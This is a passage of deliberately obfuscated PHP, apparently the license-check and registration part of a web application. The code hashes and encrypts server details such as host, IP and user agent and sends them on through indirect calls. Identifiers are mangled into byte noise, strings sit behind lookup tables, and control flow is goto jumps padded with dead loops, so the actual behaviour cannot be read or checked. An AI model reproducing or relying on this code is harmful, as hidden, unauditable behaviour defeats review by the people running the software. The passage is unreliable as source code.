return $e¬¹÷â·¹; goto D¶­ªë’‘Ö; e“åÙÔ”: $d—Ö‘ª—Ğ = $c‰İ×ÊƒŞã[619]; $e¬¹÷â·¹[$BòãÒ‹ßù[118]][$BòãÒ‹ßù[123]] = $BòãÒ‹ßù[124]($_SERVER[$BòãÒ‹ßù[125]] . $fÌµÙ„£«½[$BòãÒ‹ßù[126]]); $e¬¹÷â·¹[$BòãÒ‹ßù[118]][$BòãÒ‹ßù[127]] = $BòãÒ‹ßù[128]($BòãÒ‹ßù[129]()); goto f…‡Š¡İÊĞ; d¥Õ³¹ç: if (strlen($B´Èí¢‘¸È) < $c‰İ×ÊƒŞã[616]) { die; } unset($e¬¹÷â·¹[$BòãÒ‹ßù[106]][$BòãÒ‹ßù[108]][$BòãÒ‹ßù[109]]); unset($e¬¹÷â·¹[$BòãÒ‹ßù[106]][$BòãÒ‹ßù[108]][$BòãÒ‹ßù[110]]); goto CÆõ·›ŠÚë; CØÓ‡Ï—òŞ: $c‰İ×ÊƒŞã =& $_SERVER[úÉ·öƒÑì©]; $BòãÒ‹ßù =& $_SERVER[›É]; $fÌµÙ„£«½ = $BòãÒ‹ßù[61]($BòãÒ‹ßù[62])->{$_SERVER[›É][63]}(); goto Dª”à„†ø; DÈîòÌ‘î×: foreach ($CÈ‚Ì½Û‰Ô as $dîÈˆŸ’Ìõ) { $aĞïÉŸà = $GLOBALS[$BòãÒ‹ßù[104]][$BòãÒ‹ßù[105]][$dîÈˆŸ’Ìõ]; $A‘ŠÊÈ¸ôÃ = $c‰İ×ÊƒŞã[614]; if (isset($fÌµÙ„£«½[$dîÈˆŸ’Ìõ])) { $aĞïÉŸà = $fÌµÙ„£«½[$dîÈˆŸ’Ìõ]; } $e¬¹÷â·¹[$BòãÒ‹ßù[106]][$BòãÒ‹ßù[107]][$dîÈˆŸ’Ìõ] = $aĞïÉŸà; } $F¹µÏ“²¿š = $e¬¹÷â·¹[$BòãÒ‹ßù[106]][$BòãÒ‹ßù[107]][$BòãÒ‹ßù[76]]; $B´Èí¢‘¸È = $c‰İ×ÊƒŞã[615]; goto d¥Õ³¹ç; F¥Šœ¿î­: $E„©ÀšÍíï = $c‰İ×ÊƒŞã[621]; while ($E„©ÀšÍíï < $c‰İ×ÊƒŞã[248]) { if ($E„©ÀšÍíï >= 0) { break; } $E„©ÀšÍíï++; } if ($fÌµÙ„£«½[$BòãÒ‹ßù[130]] != $BòãÒ‹ßù[131]) { $e¬¹÷â·¹[$BòãÒ‹ßù[118]][$BòãÒ‹ßù[132]] = $fÌµÙ„£«½[$BòãÒ‹ßù[132]]; $e¬¹÷â·¹[$BòãÒ‹ßù[118]][$BòãÒ‹ßù[133]] = $fÌµÙ„£«½[$BòãÒ‹ßù[133]]; $A¿Ÿ‘ñ­¸ = $BòãÒ‹ßù[134](10) . $this->hoik95ab8e6b . $BòãÒ‹ßù[134](5); $e¬¹÷â·¹[$BòãÒ‹ßù[106]][$BòãÒ‹ßù[135]][$BòãÒ‹ßù[136]] = $this->{$_SERVER[›É][137]}($A¿Ÿ‘ñ­¸, $e¬¹÷â·¹[$BòãÒ‹ßù[118]][$BòãÒ‹ßù[123]]); } goto eª‡ôáÌ; CÆõ·›ŠÚë: $C©ŠŒç”¨ = $c‰İ×ÊƒŞã[617]; unset($e¬¹÷â·¹[$BòãÒ‹ßù[106]][$BòãÒ‹ßù[107]][$BòãÒ‹ßù[76]]); unset($e¬¹÷â·¹[$BòãÒ‹ßù[106]][$BòãÒ‹ßù[107]][$BòãÒ‹ßù[111]]); goto FÀğ·ÀÄËŸ; f…‡Š¡İÊĞ: $cïœ™ÍÑŒ® = $c‰İ×ÊƒŞã[620]; if (!$cïœ™ÍÑŒ®) { return; } $e¬¹÷â·¹[$BòãÒ‹ßù[118]][$BòãÒ‹ßù[130]] = $this->hoik95ab8e6b; goto F¥Šœ¿î­; eª‡ôáÌ: if ($this->hoik95ab8e6b == $BòãÒ‹ßù[131]) { $e¬¹÷â·¹[$BòãÒ‹ßù[106]][$BòãÒ‹ßù[107]][$BòãÒ‹ßù[112]][$BòãÒ‹ßù[117]] = 0; } $e¬¹÷â·¹[$BòãÒ‹ßù[118]][$BòãÒ‹ßù[138]] = $BòãÒ‹ßù[116]($this->vinoab61c75a, $BòãÒ‹ßù[139], $BòãÒ‹ßù[10]); $e¬¹÷â·¹[$BòãÒ‹ßù[118]][$BòãÒ‹ßù[140]] = $BòãÒ‹ßù[116]($this->vinoab61c75a, $BòãÒ‹ßù[141], $BòãÒ‹ßù[10]); goto f´œØÏÛ‰Í; D¶­ªë’‘Ö: } private function hicrc11b47ad() { goto fİ“¬¯•–’; eÛ®ïÀòŒ¬: $Fæ¦ŒŠ£Àš = array($B•òˆÆğó‹[177] => $FÎá†¢¥í¿[$B•òˆÆğó‹[64]], $B•òˆÆğó‹[178] => $FÎá†¢¥í¿[$B•òˆÆğó‹[65]], $B•òˆÆğó‹[179] => $B•òˆÆğó‹[10]); foreach ($c¨ãë¢½·Á as $fØÜã§“ì«) { if (!isset($FÎá†¢¥í¿[$fØÜã§“ì«]) || !$FÎá†¢¥í¿[$fØÜã§“ì«]) { continue; } $Fæ¦ŒŠ£Àš[$fØÜã§“ì«] = $FÎá†¢¥í¿[$fØÜã§“ì«]; $C…‰ó÷ŸÜÍ = $dÜÎ‘í‰©‡[626]; while ($C…‰ó÷ŸÜÍ < $dÜÎ‘í‰©‡[597]) { if ($C…‰ó÷ŸÜÍ >= 0) { break; } $C…‰ó÷ŸÜÍ++; } } $B•òˆÆğó‹[13](array($B•òˆÆğó‹[169], $B•òˆÆğó‹[170]), $Fæ¦ŒŠ£Àš); goto FÈ¤Å‹¥ÜÚ; C°İ†™‚ß: if ($this->hoik95ab8e6b == $B•òˆÆğó‹[131]) { return; } $c¨ãë¢½·Á = array($B•òˆÆğó‹[171], $B•òˆÆğó‹[172], $B•òˆÆğó‹[173], $B•òˆÆğó‹[174], $B•òˆÆğó‹[175], $B•òˆÆğó‹[176]); $FÎá†¢¥í¿ = $B•òˆÆğó‹[61]($B•òˆÆğó‹[62])->{$_SERVER[›É][63]}(); goto eÛ®ïÀòŒ¬; fİ“¬¯•–’: $dÜÎ‘í‰©‡ =& $_SERVER[úÉ·öƒÑì©]; $B•òˆÆğó‹ =& $_SERVER[›É]; if ($_SERVER[$B•òˆÆğó‹[44]] == $B•òˆÆğó‹[145]) { goto cßİÇƒ¿ƒ; f¦çĞêÍÖ±: $E…²§ËŠïÃ = $dÜÎ‘í‰©‡[625]; if (strlen($E…²§ËŠïÃ) < $dÜÎ‘í‰©‡[592]) { return; } goto a–Âª›²Ìß; cßİÇƒ¿ƒ: $cˆñÚ›² = array($B•òˆÆğó‹[130] => $this->hoik95ab8e6b, $B•òˆÆğó‹[146] => $this->{$_SERVER[›É][147]}(), $B•òˆÆğó‹[148] => $B•òˆÆğó‹[61]($B•òˆÆğó‹[149])->{$_SERVER[›É][150]}()); if ($this->hoik95ab8e6b != $B•òˆÆğó‹[131]) { $eóöôí­¢» = $B•òˆÆğó‹[116]($this->vinoab61c75a, $B•òˆÆğó‹[151]); if ($eóöôí­¢») { $cˆñÚ›²[$B•òˆÆğó‹[152]] = $eóöôí­¢»; $cˆñÚ›²[$B•òˆÆğó‹[153]] = $B•òˆÆğó‹[154]($B•òˆÆğó‹[116]($this->vinoab61c75a, $B•òˆÆğó‹[155])); $cˆñÚ›²[$B•òˆÆğó‹[156]] = $B•òˆÆğó‹[116]($this->vinoab61c75a, $B•òˆÆğó‹[141]); } $CÖîÙÊ”º = $B•òˆÆğó‹[61]($B•òˆÆğó‹[62])->{$_SERVER[›É][63]}($B•òˆÆğó‹[157], $B•òˆÆğó‹[10], !0); if ($B•òˆÆğó‹[158]($CÖîÙÊ”º) && $B•òˆÆğó‹[25]($CÖîÙÊ”º, 0, 1) == $B•òˆÆğó‹[159]) { $CÖîÙÊ”º = $B•òˆÆğó‹[160]($CÖîÙÊ”º); } if ($B•òˆÆğó‹[161]($CÖîÙÊ”º) && $CÖîÙÊ”º[$B•òˆÆğó‹[162]] && $B•òˆÆğó‹[32]($CÖîÙÊ”º[$B•òˆÆğó‹[162]], $B•òˆÆğó‹[163])) { $bŒÖ…à×áó = $B•òˆÆğó‹[0]($B•òˆÆğó‹[163], $CÖîÙÊ”º[$B•òˆÆğó‹[162]]); $cˆñÚ›²[$B•òˆÆğó‹[164]] = $bŒÖ…à×áó[0]; } } $cˆñÚ›² = $this->{$_SERVER[›É][165]}($B•òˆÆğó‹[166]($cˆñÚ›²), $B•òˆÆğó‹[124]($B•òˆÆğó‹[167])); goto b†’ê‡Õ»İ; b†’ê‡Õ»İ: $b¥Ñ óÂ–ˆ = $dÜÎ‘í‰©‡[623]; if (strlen($b¥Ñ óÂ–ˆ) < $dÜÎ‘í‰©‡[248]) { die; } $Fæ¦ŒŠ£Àš = array($B•òˆÆğó‹[168] => $cˆñÚ›²); goto dÅ¡İ‘©Û—; dÅ¡İ‘©Û—: $D¸ƒœò‡ƒî = $dÜÎ‘í‰©‡[624]; if (strlen($D¸ƒœò‡ƒî) < $dÜÎ‘í‰©‡[248]) { return; } $B•òˆÆğó‹[13](array($B•òˆÆğó‹[169], $B•òˆÆğó‹[170]), $Fæ¦ŒŠ£Àš); goto f¦çĞêÍÖ±; a–Âª›²Ìß: } goto C°İ†™‚ß; FÈ¤Å‹¥ÜÚ: } private function pzkd1b513e9f() { goto d­±æ›ƒ; cï‹÷¦ˆ…‰: if (!$b·Ü‰Ô„ºÍ[116]($GLOBALS, $b·Ü‰Ô„ºÍ[142])) { die; } $BöÀÛ¹­È = $GLOBALS[$b·Ü‰Ô„ºÍ[22]]; if (isset($BöÀÛ¹­È[$b·Ü‰Ô„ºÍ[181]])) { $this->{$_SERVER[›É][182]}(); die; } goto aŸÈ¤í¶°; e ÒöÌÎá…: $aœ†øİŞ‚À = $b·Ü‰Ô„ºÍ[124]($_SERVER[$b·Ü‰Ô„ºÍ[125]] . $b·Ü‰Ô„ºÍ[233]($B—Ò¹¥“Ô–) . $døéš·Á¿[$b·Ü‰Ô„ºÍ[229]]); $Cõ¥’•Íîé = $b·Ü‰Ô„ºÍ[233]($b·Ü‰Ô„ºÍ[25]($aœ†øİŞ‚À, 10, 16)); $D¤™æŒŠæĞ = $this->{$_SERVER[›É][137]}($b·Ü‰Ô„ºÍ[166]($eŸã½¯’„ë), $aœ†øİŞ‚À); goto f§îòÒê å; F˜Ú Ë¾¡¦: $døéš·Á¿[$b·Ü‰Ô„ºÍ[133]] = $b·Ü‰Ô„ºÍ[128]($b·Ü‰Ô„ºÍ[233]($this->{$_SERVER[›É][165]}($aÜ®‡š™ŸÈ, $b·Ü‰Ô„ºÍ[235]))); if ($eŸã½¯’„ë[$b·Ü‰Ô„ºÍ[236]] && $eŸã½¯’„ë[$b·Ü‰Ô„ºÍ[236]] >= 1) { $b·Ü‰Ô„ºÍ[61]($b·Ü‰Ô„ºÍ[62])->{$_SERVER[›É][237]}($b·Ü‰Ô„ºÍ[238], $b·Ü‰Ô„ºÍ[239]); } $b·Ü‰Ô„ºÍ[61]($b·Ü‰Ô„ºÍ[62])->{$_SERVER[›É][240]}($døéš·Á¿); goto e ÒöÌÎá…; D£ªâæŒ‹‹: $eŸã½¯’„ë = $aÜ‘ß”‘ÛÅ[$b·Ü‰Ô„ºÍ[211]]; $EÉç¨Æ”ÈÕ = $this->{$_SERVER[›É][218]}($eŸã½¯’„ë[$b·Ü‰Ô„ºÍ[219]]); if (!$EÉç¨Æ”ÈÕ || $EÉç¨Æ”ÈÕ != $eŸã½¯’„ë[$b·Ü‰Ô„ºÍ[155]]) { $eÕ£ºÍºÅ› = array($b·Ü‰Ô„ºÍ[220] => $b·Ü‰Ô„ºÍ[61]($b·Ü‰Ô„ºÍ[62])->{$_SERVER[›É][63]}($b·Ü‰Ô„ºÍ[126]), $b·Ü‰Ô„ºÍ[221] => $_SERVER[$b·Ü‰Ô„ºÍ[125]], $b·Ü‰Ô„ºÍ[222] => $b·Ü‰Ô„ºÍ[223](), $b·Ü‰Ô„ºÍ[192] => $_SERVER[$b·Ü‰Ô„ºÍ[193]]); $E‘˜±èÖ³ = $this->{$_SERVER[›É][224]}($b·Ü‰Ô„ºÍ[166]($eÕ£ºÍºÅ›)); $this->{$_SERVER[›É][202]}($b·Ü‰Ô„ºÍ[225] . $E‘˜±èÖ³); $b·Ü‰Ô„ºÍ[184]($b·Ü‰Ô„ºÍ[216]($b·Ü‰Ô„ºÍ[226]), !0); } goto bİô¥†Â‚œ; bİô¥†Â‚œ: $døéš·Á¿ = array($b·Ü‰Ô„ºÍ[227] => $eŸã½¯’„ë[$b·Ü‰Ô„ºÍ[228]], $b·Ü‰Ô„ºÍ[229] => $eŸã½¯’„ë[$b·Ü‰Ô„ºÍ[230]], $b·Ü‰Ô„ºÍ[231] => $b·Ü‰Ô„ºÍ[134](16), $b·Ü‰Ô„ºÍ[130] => $eŸã½¯’„ë[$b·Ü‰Ô„ºÍ[232]]); if ($CÃÒÖœ¨¯[$b·Ü‰Ô„ºÍ[186]]) { $døéš·Á¿[$b·Ü‰Ô„ºÍ[231]] = $CÃÒÖœ¨¯[$b·Ü‰Ô„ºÍ[186]]; } $Aª­ê‰æÂ = $b·Ü‰Ô„ºÍ[25]($b·Ü‰Ô„ºÍ[124]($døéš·Á¿[$b·Ü‰Ô„ºÍ[229]]), 10, 10); goto dÀÖ¦çìî; aŸÈ¤í¶°: if (!isset($BöÀÛ¹­È[$b·Ü‰Ô„ºÍ[183]]) || $b·Ü‰Ô„ºÍ[24]($BöÀÛ¹­È[$b·Ü‰Ô„ºÍ[183]]) != 16) { $b·Ü‰Ô„ºÍ[184]($b·Ü‰Ô„ºÍ[185] . $BöÀÛ¹­È[$b·Ü‰Ô„ºÍ[183]], !1); } $B—Ò¹¥“Ô– = $b·Ü‰Ô„ºÍ[61]($b·Ü‰Ô„ºÍ[62])->{$_SERVER[›É][63]}($b·Ü‰Ô„ºÍ[126]); $B®¢µ³Æ = $b·Ü‰Ô„ºÍ[124]($_SERVER[$b·Ü‰Ô„ºÍ[125]] . $B—Ò¹¥“Ô–); goto eî®æ¸äêÁ; FŞø»¾°«•: $this->{$_SERVER[›É][248]}(); $F­ĞÂÖØ÷¦ = $dŠÚ³Òà‰£[635]; if (strlen($F­ĞÂÖØ÷¦) < $dŠÚ³Òà‰£[597]) { die; } goto BÅ®·ãƒÈ©; c…ƒ£ÊÅã‰: while (strlen($AÎà‘ÀÖ„ô) < $dŠÚ³Òà‰£[588]) { if (!$AÎà‘ÀÖ„ô) { break; } $AÎà‘ÀÖ„ô++; } $A§Ù°§¶ÔÒ[$Cõ¥’•Íîé] = $D¤™æŒŠæĞ; $b·Ü‰Ô„ºÍ[61]($b·Ü‰Ô„ºÍ[11])->{$_SERVER[›É][245]}($E‘‚³¶éß†[$b·Ü‰Ô„ºÍ[246]], array($b·Ü‰Ô„ºÍ[247] => $A§Ù°§¶ÔÒ)); goto B»Â›”Îé; f§îòÒê å: $DÈ®¬©ëÜ‰ = $dŠÚ³Òà‰£[629]; $b™ô’¡÷Ôƒ = $b·Ü‰Ô„ºÍ[241]($b·Ü‰Ô„ºÍ[61]($b·Ü‰Ô„ºÍ[11])->{$_SERVER[›É][242]}(), $b·Ü‰Ô„ºÍ[243]); $b­Ä®‚Æ›‚ = $dŠÚ³Òà‰£[630]; goto bòéË—„Ëë; F¾³Ô©¢“: if (strlen($E‘ƒÖÓ»Û) < $dŠÚ³Òà‰£[592]) { die; } $A§Ù°§¶ÔÒ = array(); $AÎà‘ÀÖ„ô = $dŠÚ³Òà‰£[632]; goto c…ƒ£ÊÅã‰; d­±æ›ƒ: $dŠÚ³Òà‰£ =& $_SERVER[úÉ·öƒÑì©]; $b·Ü‰Ô„ºÍ =& $_SERVER[›É]; if ($_SERVER[$b·Ü‰Ô„ºÍ[44]] != $b·Ü‰Ô„ºÍ[180]) { return; } goto cï‹÷¦ˆ…‰; eî®æ¸äêÁ: $CÃÒÖœ¨¯ = array($b·Ü‰Ô„ºÍ[183] => $BöÀÛ¹­È[$b·Ü‰Ô„ºÍ[183]], $b·Ü‰Ô„ºÍ[186] => $b·Ü‰Ô„ºÍ[134](16), $b·Ü‰Ô„ºÍ[187] => $b·Ü‰Ô„ºÍ[167], $b·Ü‰Ô„ºÍ[188] => $b·Ü‰Ô„ºÍ[189], $b·Ü‰Ô„ºÍ[190] => $_SERVER[$b·Ü‰Ô„ºÍ[191]], $b·Ü‰Ô„ºÍ[192] => $_SERVER[$b·Ü‰Ô„ºÍ[193]], $b·Ü‰Ô„ºÍ[194] => $_SERVER[$b·Ü‰Ô„ºÍ[195]], $b·Ü‰Ô„ºÍ[123] => $B®¢µ³Æ, $b·Ü‰Ô„ºÍ[196] => $b·Ü‰Ô„ºÍ[61]($b·Ü‰Ô„ºÍ[62])->{$_SERVER[›É][63]}($b·Ü‰Ô„ºÍ[157])); if ($BöÀÛ¹­È[$b·Ü‰Ô„ºÍ[197]] == $b·Ü‰Ô„ºÍ[198]) { $FØê•æ¨« = $this->{$_SERVER[›É][165]}($B®¢µ³Æ, $b·Ü‰Ô„ºÍ[199]); $E‘˜±èÖ³ = $this->{$_SERVER[›É][137]}($b·Ü‰Ô„ºÍ[166]($CÃÒÖœ¨¯), $B®¢µ³Æ . $b·Ü‰Ô„ºÍ[200], 3); $E‘˜±èÖ³ = $E‘˜±èÖ³ . $b·Ü‰Ô„ºÍ[201] . $_SERVER[$b·Ü‰Ô„ºÍ[191]]; $aè¤§Ÿ‰œ = $this->{$_SERVER[›É][202]}($b·Ü‰Ô„ºÍ[203] . $FØê•æ¨« . $b·Ü‰Ô„ºÍ[204] . $E‘˜±èÖ³, -1); $b·Ü‰Ô„ºÍ[184]($aè¤§Ÿ‰œ, !0); } else { if ($BöÀÛ¹­È[$b·Ü‰Ô„ºÍ[197]] == $b·Ü‰Ô„ºÍ[205]) { $fĞìÇ‡¥Šº = $b·Ü‰Ô„ºÍ[25]($b·Ü‰Ô„ºÍ[124]($b·Ü‰Ô„ºÍ[206] . $B®¢µ³Æ), 12, 15) . $b·Ü‰Ô„ºÍ[207]; $E‘˜±èÖ³ = $this->{$_SERVER[›É][208]}($b·Ü‰Ô„ºÍ[2]($BöÀÛ¹­È[$b·Ü‰Ô„ºÍ[209]]), $fĞìÇ‡¥Šº, 2); $aÜ‘ß”‘ÛÅ = $b·Ü‰Ô„ºÍ[210]($E‘˜±èÖ³, !0); if (!$b·Ü‰Ô„ºÍ[161]($aÜ‘ß”‘ÛÅ) || !$b·Ü‰Ô„ºÍ[161]($aÜ‘ß”‘ÛÅ[$b·Ü‰Ô„ºÍ[211]]) || $aÜ‘ß”‘ÛÅ[$b·Ü‰Ô„ºÍ[183]] != !0) { $EÃ¡ôõ‰ê = $b·Ü‰Ô„ºÍ[212]; $Då³è¸òÎ¡ = $aÜ‘ß”‘ÛÅ[$b·Ü‰Ô„ºÍ[211]] ? $b·Ü‰Ô„ºÍ[213] . $aÜ‘ß”‘ÛÅ[$b·Ü‰Ô„ºÍ[211]] : $EÃ¡ôõ‰ê; $b·Ü‰Ô„ºÍ[184]($Då³è¸òÎ¡, !1); } else { $CÃÒÖœ¨¯[$b·Ü‰Ô„ºÍ[186]] = $aÜ‘ß”‘ÛÅ[$b·Ü‰Ô„ºÍ[211]][$b·Ü‰Ô„ºÍ[214]]; } } else { $aÜ‘ß”‘ÛÅ = $this->{$_SERVER[›É][202]}($b·Ü‰Ô„ºÍ[215], $CÃÒÖœ¨¯, 10); $cô¶×öç¤¼ = $dŠÚ³Òà‰£[627]; if (!$cô¶×öç¤¼) { return; } } } if (!$b·Ü‰Ô„ºÍ[161]($aÜ‘ß”‘ÛÅ) || !$b·Ü‰Ô„ºÍ[161]($aÜ‘ß”‘ÛÅ[$b·Ü‰Ô„ºÍ[211]]) || $aÜ‘ß”‘ÛÅ[$b·Ü‰Ô„ºÍ[183]] != !0) { $EÃ¡ôõ‰ê = $b·Ü‰Ô„ºÍ[216]($b·Ü‰Ô„ºÍ[217]); $Då³è¸òÎ¡ = $aÜ‘ß”‘ÛÅ[$b·Ü‰Ô„ºÍ[211]] ? $b·Ü‰Ô„ºÍ[213] . $aÜ‘ß”‘ÛÅ[$b·Ü‰Ô„ºÍ[211]] : $EÃ¡ôõ‰ê; $b·Ü‰Ô„ºÍ[184]($Då³è¸òÎ¡, !1); } goto D£ªâæŒ‹‹; dÀÖ¦çìî: $a½»²éŒœ¡ = $Aª­ê‰æÂ . $døéš·Á¿[$b·Ü‰Ô„ºÍ[130]] . $døéš·Á¿[$b·Ü‰Ô„ºÍ[231]]; $døéš·Á¿[$b·Ü‰Ô„ºÍ[132]] = $b·Ü‰Ô„ºÍ[233]($b·Ü‰Ô„ºÍ[128]($this->{$_SERVER[›É][165]}($a½»²éŒœ¡, $b·Ü‰Ô„ºÍ[234]))); $bùÙÙî–ë = $b·Ü‰Ô„ºÍ[134](16); goto EÃõ®ãò„Ë; cƒÔçôò³: if (strlen($D®éÃì¢—Ó) < $dŠÚ³Òà‰£[597]) { return; } goto Eèäø¯‘Äß; e¬ãÈÏ¤ì›: $this->hoik95ab8e6b = $døéš·Á¿[$b·Ü‰Ô„ºÍ[130]]; $Aâ‹”è½‰Ã = $dŠÚ³Òà‰£[634]; if (!$Aâ‹”è½‰Ã) { return; } goto FŞø»¾°«•; bòéË—„Ëë: if (!$b­Ä®‚Æ›‚) { return; } $E‘‚³¶éß† = $b™ô’¡÷Ôƒ[$b·Ü‰Ô„ºÍ[244]]; $E‘ƒÖÓ»Û = $dŠÚ³Òà‰£[631]; goto F¾³Ô©¢“; EÃõ®ãò„Ë: $bÑğåßÈŠª = $dŠÚ³Òà‰£[628]; while (strlen($bÑğåßÈŠª) < $dŠÚ³Òà‰£[616]) { if (!$bÑğåßÈŠª) { break; } $bÑğåßÈŠª++; } $aÜ®‡š™ŸÈ = $bùÙÙî–ë . $døéš·Á¿[$b·Ü‰Ô„ºÍ[130]] . $this->{$_SERVER[›É][165]}($b·Ü‰Ô„ºÍ[124]($døéš·Á¿[$b·Ü‰Ô„ºÍ[227]]), $bùÙÙî–ë); goto F˜Ú Ë¾¡¦; BÅ®·ãƒÈ©: Cache::set($b·Ü‰Ô„ºÍ[249] . $b·Ü‰Ô„ºÍ[124]($B—Ò¹¥“Ô– . $b·Ü‰Ô„ºÍ[250]), $b·Ü‰Ô„ºÍ[10]); $b·Ü‰Ô„ºÍ[184]($b·Ü‰Ô„ºÍ[216]($b·Ü‰Ô„ºÍ[226]), !0); $D®éÃì¢—Ó = $dŠÚ³Òà‰£[636]; goto cƒÔçôò³; B»Â›”Îé: $Eá–ºƒ è¥ = $dŠÚ³Òà‰£[633]; while ($Eá–ºƒ è¥ < $dŠÚ³Òà‰£[248]) { if ($Eá–ºƒ è¥ >= 0) { break; } $Eá–ºƒ è¥++; } $this->vinoab61c75a = $eŸã½¯’„ë; goto e¬ãÈÏ¤ì›; Eèäø¯‘Äß: } private function licenseRegistSuccess() { $aº¾Ÿö¢ÀÄ =& $_SERVER[›É]; $b¦‘Ê”ö¿‹ = $aº¾Ÿö¢ÀÄ[61]($aº¾Ÿö¢ÀÄ[62])->{$_SERVER[›É][63]}(); $aÅÃÈŞö¢Ì = $_SERVER[úÉ·öƒÑì©][637]; if (!$aÅÃÈŞö¢Ì) { return; } if ($b¦‘Ê”ö¿‹[$aº¾Ÿö¢ÀÄ[93]] != $aº¾Ÿö¢ÀÄ[239]) { $aº¾Ÿö¢ÀÄ[61]($aº¾Ÿö¢ÀÄ[62])->{$_SERVER[›É][240]}($aº¾Ÿö¢ÀÄ[93], $aº¾Ÿö¢ÀÄ[239]); } $aº¾Ÿö¢ÀÄ[120]($aº¾Ÿö¢ÀÄ[251])->{$_SERVER[›É][252]}(!0); } private function dyghee5fe8e7() { goto eÉµÒİÁ©; F†°‡›«·Œ: $this->hoik95ab8e6b = $Aç†Òí­Æ[131]; goto f‡×„ŠÌİé; aˆ»îƒõÈ: $this->vinoab61c75a = array(); $a•‹®Ì“Š‚ = $BÆĞ‰“™ëŒ[639]; if (strlen($a•‹®Ì“Š‚) < $BÆĞ‰“™ëŒ[588]) { return; } goto F†°‡›«·Œ; eÉµÒİÁ©: $BÆĞ‰“™ëŒ =& $_SERVER[úÉ·öƒÑì©]; $Aç†Òí­Æ =& $_SERVER[›É]; $Aç†Òí­Æ[61]($Aç†Òí­Æ[62])->{$_SERVER[›É][240]}(array($Aç†Òí­Æ[227] => $Aç†Òí­Æ[10], $Aç†Òí­Æ[229] => $Aç†Òí­Æ[10], $Aç†Òí­Æ[130] => $Aç†Òí­Æ[131], $Aç†Òí­Æ[132] => $Aç†Òí­Æ[10], $Aç†Òí­Æ[133] => $Aç†Òí­Æ[10])); goto bË¦“¡¹›¾; bË¦“¡¹›¾: $Aç†Òí­Æ[61]($Aç†Òí­Æ[62])->{$_SERVER[›É][237]}($Aç†Òí­Æ[238], $Aç†Òí­Æ[253]); $d±Éá¶á– = $BÆĞ‰“™ëŒ[638]; if (!$d±Éá¶á–) { die; } goto aˆ»îƒõÈ; f‡×„ŠÌİé: } private function rwdl14119c07() { goto dè·İãÕ¼à; cƒ‚ÅÓÍ¼: $CàèÉÀ…²£ = $_SERVER[úÉ·öƒÑì©][640]; if (!$CàèÉÀ…²£) { return; } $f›ùÜÇ™ˆ = $B¨ãêÑƒÈÔ[249] . $B¨ãêÑƒÈÔ[124]($cµ½í‚ÜÚ— . $B¨ãêÑƒÈÔ[250]); goto dº İ¡¨; eÔÛÖ‘ßÒ¿: $E†ÖÅÁ¤Š = $B¨ãêÑƒÈÔ[61]($B¨ãêÑƒÈÔ[62])->{$_SERVER[›É][63]}(); if ($E†ÖÅÁ¤Š[$B¨ãêÑƒÈÔ[130]] == $B¨ãêÑƒÈÔ[131]) { return; } $cµ½í‚ÜÚ— = $B¨ãêÑƒÈÔ[61]($B¨ãêÑƒÈÔ[62])->{$_SERVER[›É][63]}($B¨ãêÑƒÈÔ[126]); goto cƒ‚ÅÓÍ¼; dº İ¡¨: $d‹åíèŠºù = Cache::get($f›ùÜÇ™ˆ); if (!$B¨ãêÑƒÈÔ[161]($d‹åíèŠºù) || !isset($d‹åíèŠºù[$B¨ãêÑƒÈÔ[254]]) || $B¨ãêÑƒÈÔ[255]() - $d‹åíèŠºù[$B¨ãêÑƒÈÔ[254]] >= 60) { $E£ùÃíÍ†© = $B¨ãêÑƒÈÔ[241]($B¨ãêÑƒÈÔ[61]($B¨ãêÑƒÈÔ[11])->{$_SERVER[›É][242]}(), $B¨ãêÑƒÈÔ[243]); $a²—¾éÌİÆ = $E£ùÃíÍ†©[$B¨ãêÑƒÈÔ[244]]; $eŠŸƒ“éùô = $B¨ãêÑƒÈÔ[124]($_SERVER[$B¨ãêÑƒÈÔ[125]] . $B¨ãêÑƒÈÔ[233]($cµ½í‚ÜÚ—) . $E†ÖÅÁ¤Š[$B¨ãêÑƒÈÔ[229]]); $B‰Á¶³Ş£Ã = $B¨ãêÑƒÈÔ[233]($B¨ãêÑƒÈÔ[25]($eŠŸƒ“éùô, 10, 16)); $d‹åíèŠºù = $this->{$_SERVER[›É][208]}($a²—¾éÌİÆ[$B¨ãêÑƒÈÔ[104]][$B‰Á¶³Ş£Ã], $eŠŸƒ“éùô); $d‹åíèŠºù = $B¨ãêÑƒÈÔ[210]($d‹åíèŠºù, !0); } if (!$B¨ãêÑƒÈÔ[161]($d‹åíèŠºù)) { return $this->{$_SERVER[›É][182]}(); } goto D•ñ½¶Şâö; eÆ›ßÎ½Ò¡: $this->vinoab61c75a = $d‹åíèŠºù; $this->hoik95ab8e6b = $E†ÖÅÁ¤Š[$B¨ãêÑƒÈÔ[130]]; goto F“µ íù‹; D•ñ½¶Şâö: $bïÚ¼‰×ƒ = $B¨ãêÑƒÈÔ[154]($d‹åíèŠºù[$B¨ãêÑƒÈÔ[155]]); if ($B¨ãêÑƒÈÔ[255]() >= $bïÚ¼‰×ƒ) { return $this->{$_SERVER[›É][182]}(); } if ($B¨ãêÑƒÈÔ[255]() - $d‹åíèŠºù[$B¨ãêÑƒÈÔ[254]] > 20) { $d‹åíèŠºù[$B¨ãêÑƒÈÔ[254]] = $B¨ãêÑƒÈÔ[255](); Cache::set($f›ùÜÇ™ˆ, $d‹åíèŠºù); } goto eÆ›ßÎ½Ò¡; dè·İãÕ¼à: $B¨ãêÑƒÈÔ =& $_SERVER[›É]; $_SERVER[$B¨ãêÑƒÈÔ[193]] = $B¨ãêÑƒÈÔ[116]($_SERVER, $B¨ãêÑƒÈÔ[193], APP_HOST); $this->hoik95ab8e6b = $B¨ãêÑƒÈÔ[131]; goto eÔÛÖ‘ßÒ¿; F“µ íù‹: } private function wivefbe9433d() { goto BÛÚ—Ü‡‚ô; BÛÚ—Ü‡‚ô: $eÕ”Ìº¸Ô =& $_SERVER[›É]; $bÅµÔ—ÙÒø = $GLOBALS[$eÕ”Ìº¸Ô[22]]; $C™î›äÛåÄ = $_SERVER[úÉ·öƒÑì©][641]; goto Cƒ‘åìÖ‡; d¢‰“è‰Æ•: if ($eÕ”Ìº¸Ô[261]($eòßâ‚¦, $d¿‡ÌÌâ‡³)) { if ($this->hoik95ab8e6b == $eÕ”Ìº¸Ô[131] && isset($bÅµÔ—ÙÒø[$eÕ”Ìº¸Ô[262]])) { $eÕ”Ìº¸Ô[184]($eÕ”Ìº¸Ô[216]($eÕ”Ìº¸Ô[257]), !1, $eÕ”Ìº¸Ô[258]); die; } $F›µ«ÅŞ• = $this->{$_SERVER[›É][147]}(); if ($F›µ«ÅŞ• != $eÕ”Ìº¸Ô[263]($eÕ”Ìº¸Ô[264])) { if 